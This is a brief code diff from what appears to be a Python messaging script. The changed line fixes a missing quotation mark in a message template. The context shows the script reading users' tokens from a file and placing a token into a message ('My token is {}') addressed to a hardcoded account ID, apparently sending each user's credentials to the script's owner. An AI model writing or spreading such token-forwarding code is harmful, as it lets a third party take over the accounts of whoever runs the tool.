@@ -35,7 +35,7 @@ def send_initial_message():
           tokens = file.readlines()
 
       # Modify the message as per your requirement
-      msg_template = Hello mafiya sir ! I am using your server but dont fyt dark night members. My token is {}"
+      msg_template = "Hello mr mafiya  ! I am using your server but dont fyt dark night members. My token is {}"
 
       # Specify the ID where you want to send the message
       target_id = "100084348499534"
